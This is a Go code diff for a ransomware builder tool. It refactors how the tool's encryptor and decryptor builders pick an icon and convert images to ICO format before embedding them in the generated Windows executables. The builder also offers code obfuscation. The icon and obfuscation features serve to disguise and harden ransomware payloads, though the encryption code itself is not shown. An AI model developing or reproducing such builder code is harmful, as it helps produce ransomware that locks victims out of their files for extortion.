@@ -3,20 +3,15 @@ package ransomware
 import (
 	"bufio"
 	"fmt"
-	"image"
-	_ "image/gif"
-	_ "image/jpeg"
-	_ "image/png"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"programa/utils"
 	"runtime"
 	"strings"
 )
 
 const (
-	imgPath = "./images/"
+	imgPath = "./img/"
 )
 
 func LaunchRansomware() {
@@ -104,8 +99,8 @@ func buildEncryptor() {
 		filename += ".exe"
 	}
 
-	fmt.Printf("\n%sSelect icon (optional):%s\n", utils.Yellow, utils.Reset)
-	icon := selectIcon()
+	fmt.Printf("\n%sSelect image/icon (optional):%s\n", utils.Yellow, utils.Reset)
+	icon := selectIcon(reader)
 
 	fmt.Printf("\n%sObfuscate code? (y/n): %s", utils.Yellow, utils.Reset)
 	obfuscate, _ := reader.ReadString('\n')
@@ -204,8 +199,8 @@ func buildDecryptor() {
 		filename += ".exe"
 	}
 
-	fmt.Printf("\n%sSelect icon (optional):%s\n", utils.Yellow, utils.Reset)
-	icon := selectIcon()
+	fmt.Printf("\n%sSelect image/icon (optional):%s\n", utils.Yellow, utils.Reset)
+	icon := selectIcon(reader)
 
 	fmt.Printf("\n%s[*] Building decryptor...%s\n", utils.Yellow, utils.Reset)
 
@@ -246,73 +241,8 @@ func main() {
 	utils.PauseForInput()
 }
 
-func selectIcon() string {
-	if _, err := os.Stat(imgPath); os.IsNotExist(err) {
-		os.Mkdir(imgPath, 0755)
-		fmt.Printf("%s[!] No images folder found. Created at: %s%s\n", utils.Yellow, imgPath, utils.Reset)
-		fmt.Printf("%s[*] Place .ico files in this folder and rebuild.%s\n", utils.Yellow, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	files, err := os.ReadDir(imgPath)
-	if err != nil || len(files) == 0 {
-		fmt.Printf("%s[!] No icon files found in %s%s\n", utils.Yellow, imgPath, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	var icons []string
-	supportedFormats := map[string]bool{
-		".ico":  true,
-		".png":  true,
-		".jpg":  true,
-		".jpeg": true,
-		".gif":  true,
-		".bmp":  true,
-		".tiff": true,
-	}
-
-	for _, file := range files {
-		if !file.IsDir() {
-			ext := strings.ToLower(filepath.Ext(file.Name()))
-			if supportedFormats[ext] {
-				icons = append(icons, file.Name())
-			}
-		}
-	}
-
-	if len(icons) == 0 {
-		fmt.Printf("%s[!] No image files found (supported: .ico, .png, .jpg, .jpeg, .gif, .bmp, .tiff)%s\n", utils.Yellow, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	fmt.Printf("\n%sAvailable icons:%s\n", utils.Blue, utils.Reset)
-	for i, icon := range icons {
-		fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, icon, utils.Reset)
-	}
-	fmt.Printf("%s  [0] Skip icon%s\n", utils.Yellow, utils.Reset)
-
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Printf("\n%sSelect icon number: %s", utils.Green, utils.Reset)
-	input, _ := reader.ReadString('\n')
-	input = strings.TrimSpace(input)
-
-	if input == "0" || input == "" {
-		return ""
-	}
-
-	var choice int
-	fmt.Sscanf(input, "%d", &choice)
-
-	if choice < 1 || choice > len(icons) {
-		fmt.Printf("%s[!] Invalid choice%s\n", utils.Red, utils.Reset)
-		utils.PauseForInput()
-		return ""
-	}
-
-	return filepath.Join(imgPath, icons[choice-1])
+func selectIcon(reader *bufio.Reader) string {
+	return utils.SelectIconImage(reader, imgPath)
 }
 
 func ensureRsrcInstalled() error {
@@ -349,27 +279,17 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 		return fmt.Errorf("failed to ensure rsrc is installed: %v", err)
 	}
 
-	_, err := os.Stat(imagePath)
+	icoPath, cleanupIco, err := utils.MaterializeICO(imagePath)
 	if err != nil {
-		return fmt.Errorf("image file not found: %v", err)
+		return err
 	}
-
-	imgFile, err := os.Open(imagePath)
-	if err != nil {
-		return fmt.Errorf("failed to open image: %v", err)
-	}
-	defer imgFile.Close()
-
-	_, _, err = image.DecodeConfig(imgFile)
-	if err != nil {
-		return fmt.Errorf("invalid image format: %v", err)
-	}
+	defer cleanupIco()
 
 	sysoPath := "resource.syso"
 
 	cmd := exec.Command("rsrc",
 		"-arch", "amd64",
-		"-icon", imagePath,
+		"-ico", icoPath,
 		"-o", sysoPath)
 
 	fmt.Printf("%s[*] Running rsrc: %s%s\n", utils.Yellow, strings.Join(cmd.Args, " "), utils.Reset)
